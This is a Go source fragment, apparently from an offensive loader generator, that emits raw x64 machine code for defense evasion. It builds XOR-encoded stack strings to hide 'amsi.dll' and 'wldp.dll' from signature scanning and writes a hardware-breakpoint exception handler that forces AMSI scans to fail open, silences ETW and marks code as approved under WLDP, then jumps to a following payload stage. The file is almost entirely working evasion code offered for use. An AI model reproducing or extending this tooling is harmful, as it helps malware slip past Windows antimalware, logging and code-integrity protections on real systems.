// Loader_Donut_Style pairs plaintext amsi.dll/wldp.dll with API resolution).
// Result: rax = module base (or NULL — resolver fail path handles it).
func emitLoadLibraryCall64(b *bytes.Buffer, family evadeHashFamily, seed string, module string) error {
	_ = family
	s := []byte(module)
	if len(s) > 23 {
		return fmt.Errorf("evade: module name too long for stack string: %s", module)
	}
	plain := make([]byte, 24)
	copy(plain, s)
	plain[len(s)] = 0

	key, err := evadeRandInt(251)
	if err != nil {
		return err
	}
	key += 2 // 2..252, non-zero
	delta, err := evadeRandInt(15)
	if err != nil {
		return err
	}
	delta += 1 // 1..15, non-zero (odd/even both fine; position mixing is per-byte)
	enc := make([]byte, 24)
	for i := range plain {
		enc[i] = plain[i] ^ byte((key+i*delta)&0xFF)
	}
	for q := 0; q < 24; q += 8 {
		imm := binary.LittleEndian.Uint64(enc[q : q+8])
		b.Write([]byte{0x48, 0xB8}) // mov rax, imm64 (encoded bytes — no plaintext atom)
		binary.Write(b, binary.LittleEndian, imm)
		if evStrings+q <= 0x78 {
			b.Write([]byte{0x48, 0x89, 0x44, 0x24, byte(evStrings + q)}) // mov [rsp+disp8], rax
		} else {
			b.Write([]byte{0x48, 0x89, 0x84, 0x24}) // mov [rsp+disp32], rax (disp8 would overflow)
			binary.Write(b, binary.LittleEndian, uint32(evStrings+q))
		}
	}
	// ---- in-place decode loop (morphable: key, delta, register choice) ----
	// lea r13, [rsp+evStrings]; xor r14d,r14d; mov ebx, key
	b.Write([]byte{0x4C, 0x8D, 0x6C, 0x24, byte(evStrings)}) // lea r13, [rsp+evStrings]
	b.Write([]byte{0x45, 0x31, 0xF6})                        // xor r14d, r14d
	b.Write([]byte{0xBB})                                    // mov ebx, imm32
	binary.Write(b, binary.LittleEndian, uint32(key))
	dloop := b.Len()
	b.Write([]byte{0x41, 0x83, 0xFE, 0x18}) // cmp r14d, 24
	var jaeDone int
	b.Write([]byte{0x73})
	jaeDone = b.Len()
	b.WriteByte(0x00)
	b.Write([]byte{0x41, 0x8A, 0x45, 0x00})  // mov al, [r13+0] (mod=01 disp8=0 — mod=00 rm=101 is RIP-relative!)
	b.Write([]byte{0x32, 0xC3})              // xor al, bl
	b.Write([]byte{0x41, 0x88, 0x45, 0x00})  // mov [r13+0], al
	b.Write([]byte{0x80, 0xC3, byte(delta)}) // add bl, delta
	b.Write([]byte{0x49, 0xFF, 0xC5})        // inc r13
	b.Write([]byte{0x45, 0xFF, 0xC6})        // inc r14d
	var jmpDloop int
	b.Write([]byte{0xEB})
	jmpDloop = b.Len()
	b.WriteByte(0x00)
	done := b.Len()
	b.Bytes()[jaeDone] = byte(done - (jaeDone + 1))
	b.Bytes()[jmpDloop] = byte(dloop - (jmpDloop + 1))

	b.Write([]byte{0x48, 0x8D, 0x4C, 0x24, byte(evStrings)}) // lea rcx, [rsp+evStrings]
	b.Write([]byte{0xFF, 0x54, 0x24, evLoadLib})             // call [rsp+evLoadLib]
	return nil
}

/*
emitHandler64 writes the VEH body.

Entry: rcx = PEXCEPTION_POINTERS. Win64 handler: returns int in eax.

	EXCEPTION_POINTERS { PEXCEPTION_RECORD; PCONTEXT }
	ExceptionRecord->ExceptionCode is the first dword.

Logic (sol-review R3 hardened):

	if ExceptionCode != 0x80000004 -> pass (0)
	rdx = ContextRecord
	rax = Rip
	for each armed slot (per-build rotation): if [rdx+DrX] == rax ->
	    require DR6.Bn for that slot, clear the owned status bit,
	    apply per-class return semantics, redirect Rip to an embedded real
	    `ret` gadget (CET shadow-stack safe: the hardware ret pops the
	    caller frame normally; Rsp is never edited by the handler).
	pass (0)

Per-class semantics (correct out-arg locations per winnt.h and the SDK
prototypes):

	hcAmsiScan: Rax = 0x80070057 (E_INVALIDARG) — hosts fail open on scan
	            error (MDSec semantics); the out AMSI_RESULT is left
	            untouched because callers discard it on failure.
	hcEtwVoid:  Rax = 0 (STATUS_SUCCESS).
	hcWldp:     R8 (3rd arg, ctx offset 0xB8) points at the out BOOL —
	            write 1 (approved) through the saved context R8, Rax = 0.
*/
func emitHandler64(b *bytes.Buffer, slotHandling []evadeHandling) error {
	// mov rax, [rcx]           ExceptionRecord
	b.Write([]byte{0x48, 0x8B, 0x01})
	// cmp dword [rax], 0x80000004
	b.Write([]byte{0x81, 0x38, 0x04, 0x00, 0x00, 0x80})
	var jnePass int
	b.Write([]byte{0x0F, 0x85})
	jnePass = b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	// rdx = [rcx+8] ContextRecord ; rax = [rdx+Rip] (0xF8 needs disp32)
	b.Write([]byte{0x48, 0x8B, 0x51, 0x08})
	b.Write([]byte{0x48, 0x8B, 0x82, 0xF8, 0x00, 0x00, 0x00})

	type arm struct {
		drOff    uint32
		slot     int // DR slot index for DR6.Bn bookkeeping
		handling evadeHandling
	}
	var arms []arm
	for i, h := range slotHandling {
		if h == 0xFF {
			continue
		}
		arms = append(arms, arm{drOff: []uint32{ctx64Dr0, ctx64Dr1, ctx64Dr2, ctx64Dr3}[i], slot: i, handling: h})
	}
	rot, err := evadeRandInt(len(arms))
	if err != nil {
		return err
	}
	rotated := append(append([]arm{}, arms[rot:]...), arms[:rot]...)

	// chain: cmp [rdx+dr], rax ; je tail (rel32 — tails exceed rel8 range)
	jeFields := make([]int, len(rotated))
	for i, a := range rotated {
		b.Write([]byte{0x48, 0x39, 0x82}) // cmp qword [rdx+disp32], rax
		binary.Write(b, binary.LittleEndian, uint32(a.drOff))
		b.Write([]byte{0x0F, 0x84}) // je rel32
		jeFields[i] = b.Len()
		binary.Write(b, binary.LittleEndian, uint32(0))
	}
	// fall-through: pass
	var jmpPass int
	b.Write([]byte{0xE9})
	jmpPass = b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))

	// tails — one per armed slot
	tailPos := make([]int, len(rotated))
	leaFixups := make([]int, len(rotated))
	for i, a := range rotated {
		tailPos[i] = b.Len()
		switch a.handling {
		case hcAmsiScan:
			b.Write([]byte{0x48, 0xC7, 0x82}) // mov qword [rdx+Rax], imm32 sign-extended
			binary.Write(b, binary.LittleEndian, uint32(ctx64Rax))
			binary.Write(b, binary.LittleEndian, uint32(0x80070057))
		case hcEtwVoid:
			b.Write([]byte{0x48, 0xC7, 0x82})
			binary.Write(b, binary.LittleEndian, uint32(ctx64Rax))
			binary.Write(b, binary.LittleEndian, uint32(0))
		case hcWldp:
			// out BOOL via saved R8 (CONTEXT offset 0xB8 — NOT 0xB0 which is Rdi)
			b.Write([]byte{0x48, 0x8B, 0x82, 0xB8, 0x00, 0x00, 0x00}) // mov rax, [rdx+R8]
			b.Write([]byte{0xC6, 0x00, 0x01})                         // mov byte [rax], 1
			b.Write([]byte{0x48, 0xC7, 0x82})
			binary.Write(b, binary.LittleEndian, uint32(ctx64Rax))
			binary.Write(b, binary.LittleEndian, uint32(0))
		}
		// clear owned DR6 status bit: and dword [rdx+0x68], ~(1<<slot)
		b.Write([]byte{0x83, 0xA2}) // and dword [rdx+disp32], imm8
		binary.Write(b, binary.LittleEndian, uint32(ctx64Dr6))
		b.WriteByte(byte(^(1 << uint(a.slot))))
		// CET-safe transfer: Rip = &ret_gadget (lea rcx rip-relative, patched)
		leaFixups[i] = b.Len() + 3                                // displacement field of the lea below
		b.Write([]byte{0x48, 0x8D, 0x0D, 0, 0, 0, 0})             // lea rcx, [rip+disp32]
		b.Write([]byte{0x48, 0x89, 0x8A, 0xF8, 0x00, 0x00, 0x00}) // mov [rdx+Rip], rcx
		// EXCEPTION_CONTINUE_EXECUTION
		b.Write([]byte{0xB8, 0xFF, 0xFF, 0xFF, 0xFF}) // mov eax, -1
		b.Write([]byte{0xC3})                         // ret (handler return)
	}

	// pass label
	passPos := b.Len()
	b.Write([]byte{0x31, 0xC0}) // xor eax, eax
	b.Write([]byte{0xC3})       // ret

	// embedded ret gadget — the intercepted function "returns" through a real
	// hardware ret, keeping CET shadow-stack accounting intact.
	retGadgetPos := b.Len()
	b.Write([]byte{0xC3}) // ret

	for i := range rotated {
		binary.LittleEndian.PutUint32(b.Bytes()[jeFields[i]:jeFields[i]+4], uint32(tailPos[i]-(jeFields[i]+4)))
		// lea rcx rip-rel: next-instruction address = leaFixups[i]+4
		binary.LittleEndian.PutUint32(b.Bytes()[leaFixups[i]:leaFixups[i]+4], uint32(retGadgetPos-(leaFixups[i]+4)))
	}
	binary.LittleEndian.PutUint32(b.Bytes()[jmpPass:jmpPass+4], uint32(passPos-(jmpPass+4)))
	binary.LittleEndian.PutUint32(b.Bytes()[jnePass:jnePass+4], uint32(passPos-(jnePass+4)))
	return nil
}

// PatchEvadeJmp patches the final `jmp rel32` of the stub so it transfers to
// the stage that follows it in the assembled artifact. nextStageOffset is
// the absolute offset of the next stage within the same buffer that will
// contain this stub.
func PatchEvadeJmp(stub []byte, meta EvadeMetadata, nextStageOffset int) error {
	if meta.JmpOffset <= 0 || meta.JmpOffset+4 > len(stub) {
		return fmt.Errorf("evade: bad jmp offset %d", meta.JmpOffset)
	}
	disp := int32(nextStageOffset - (meta.JmpOffset + 4))
	binary.LittleEndian.PutUint32(stub[meta.JmpOffset:meta.JmpOffset+4], uint32(disp))
	// The fail jump sits at a DIFFERENT offset — recompute its own displacement
	// (daybreak F-5: reusing the main displacement made the fail path overshoot
	// by the distance between the two jumps).
	if meta.FailJmpOffset > 0 && meta.FailJmpOffset+4 <= len(stub) {
		dispFail := int32(nextStageOffset - (meta.FailJmpOffset + 4))
		binary.LittleEndian.PutUint32(stub[meta.FailJmpOffset:meta.FailJmpOffset+4], uint32(dispFail))
	}
	return nil
}

// register id helpers (x64 reg field encodings)
const (
	regRAX byte = 0
	regRBX byte = 3
	regR12 byte = 12
	regR13 byte = 13
)
